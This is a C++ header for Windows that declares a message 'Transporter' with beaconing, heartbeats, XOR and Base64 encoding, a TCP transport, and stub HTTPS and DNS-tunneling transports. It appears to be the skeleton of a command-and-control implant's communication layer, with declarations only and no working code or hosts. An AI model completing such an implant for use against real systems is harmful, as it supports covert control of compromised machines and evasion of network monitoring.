// TODO: rename to ExternalMessage something?
/*
 * Transporter.h
 *
 * Purpose: Responsible for handling external messages
 *
 *
 *
 */

/*
├── Transporter (OWNS connection + processing)
│   ├── ConnectionManager (OWNS socket/network)
│   ├── BinarySerializer
│   ├── Base64Encoder
│   └── XOREncryptor
*/

#ifndef TRANSPORTER_H
#define TRANSPORTER_H

#include "MessageHandler.h"
#include "Serializer.h"
#include "Encryptor.h"
#include "Encoder.h"

#include <vector>
#include <memory>


#include <string>
#include <winsock2.h>

//#include <ws2tcpip.h>

class MessageHandler;

class Transporter
{
public:
	// constructor
	//explicit Transporter(MessageHandler* handler) : messageHandler_(handler) {}
	explicit Transporter(MessageHandler& handler) : messageHandler_(handler) {}
	// deconstructor
	virtual ~Transporter() = default; // TODO: what does default do?
	virtual bool connect() = 0;
	virtual bool send(const std::vector<uint8_t>& data) = 0;
	virtual std::vector<uint8_t> receive() = 0;
	virtual bool isConnected() = 0;
	//virtual void disconnect() = 0;

	// Process InternalMessage and convert it into raw bytes beforing sending it to the server
	bool sendMessage(const InternalMessage& msg);

	// Process raw bytes from server and convert them into an InternalMessage
	InternalMessage receiveMessage();

	void beacon();
protected:
	// default subsystems
	//MessageHandler* messageHandler_;
	MessageHandler& messageHandler_;
	BinarySerializer serializer_;
	B64Encoder encoder_;
	XorEncryptor encryptor_;
private:
	/*
	std::string server;
	uint16_t port;
	SOCKET socket = INVALID_SOCKET;
	bool connected = false;
	*/
	InternalMessage createHeartbeat();

	// TODO: delete?
	uint32_t generateId();

};



class TCPTransporter : public Transporter
{
public:
	//TCPTransporter(const std::string& server, uint16_t port) : server_(server), port_(port) {}
	//TCPTransporter(MessageHandler* messageHandler, const std::string& server, uint16_t port);
	TCPTransporter(MessageHandler& messageHandler, const std::string& server, std::string port);
	~TCPTransporter();

	// Attemps to send a std::vector<uint8_t> as a raw buffer to server
	bool send(const std::vector<uint8_t>& data);

	// Creates socket and attempts to connect to it
	// Returns true on success
	bool connect();

	// Receives raw buffer from server
	// Returns raw buffer as a std::vector<uint8_t>
	std::vector<uint8_t> receive();

	// Getter to see if we've connected to the server
	bool isConnected() { return connected_; }
	
private:
	// Initializes WSADATA by being called through the constructor 
	bool initializeWinsock();


	std::string server_;
	std::string port_;
	//uint16_t port_;
	//std::string port_;
	SOCKET socket_ = INVALID_SOCKET;
	bool connected_ = false;


};

// Handles HTTPS headers, TLS, cookies, etc.
class HTTPSTransport : public Transporter
{

public:
private:
};

// Handles DNS queries/responses, tunneling
class DNSTransport : public Transporter
{

public:
private:
};

typedef std::unique_ptr<Transporter> TransporterUniquePtr;

#endif
